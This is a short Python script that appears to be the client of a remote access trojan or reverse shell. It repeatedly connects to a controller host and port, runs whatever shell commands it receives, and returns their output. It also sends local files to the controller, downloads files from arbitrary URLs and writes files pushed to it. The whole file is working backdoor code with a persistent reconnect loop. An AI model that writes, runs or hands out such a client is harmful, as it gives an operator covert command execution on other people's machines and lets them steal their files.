import os
import sys
import time
import socket
import subprocess as sp
from urllib.request import urlopen
from common import pr, Send, Receive

HOST = '127.0.0.1'
PORT = 1000

sock = None
active = False

# ⬆️
def upload(sock, fn):
  try:
    f = open(fn, 'rb')
    d = f.read()
    f.close()

    Send(sock, d, fn)
    time.sleep(1)

    return 'File sent 🍺'
  except IOError:
    return 'Error opening file ⚠️'

def dlhttp(sock, url):
  fn = url.split('/')[-1]
  fn = fn.split('?')[0]
  fn = fn.split('#')[0]

  try:
    f = open(fn, 'wb')
    f.write(urlopen(url).read())
    f.close()
    return 'Download finished 🍺'
  except OSError as e: # TODO
    return e + ' ⚠️'

def run(s):
  p = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
  out, err = p.communicate()
  out = out.decode('utf-8')
  err = err.decode('utf-8')
  return out + '\n' + err

def cwd(prev=None):
  if prev:
    return prev + '\n' + os.getcwd() + '>'
  else:
    return os.getcwd() + '>'

while True:
  try:
    sock = socket.socket()
    sock.connect((HOST, PORT))

    if Receive(sock) == 'activate':
      active = True
      Send(sock, cwd())

    while active:
      data = Receive(sock)

      # server closed
      if not data:
        active = False
        sock.close()
        break

      if type(data) == str:
        if data.startswith('dl '):
          ret = upload(sock, data[3:])

        elif data.startswith('dlhttp '):
          ret = dlhttp(sock, data[7:])

        else:
          ret = run(data)

        Send(sock, cwd(ret))

      # ⬇️
      else:
        try:
          f = open(data[0], 'wb')
          f.write(data[1])
          f.close()
          ret = 'File received 🍺'
        except IOError:
          ret = 'Error opening file ⚠️'     
       
        Send(sock, cwd(ret))

  except socket.error:
    sock.close()
    time.sleep(10)
    continue
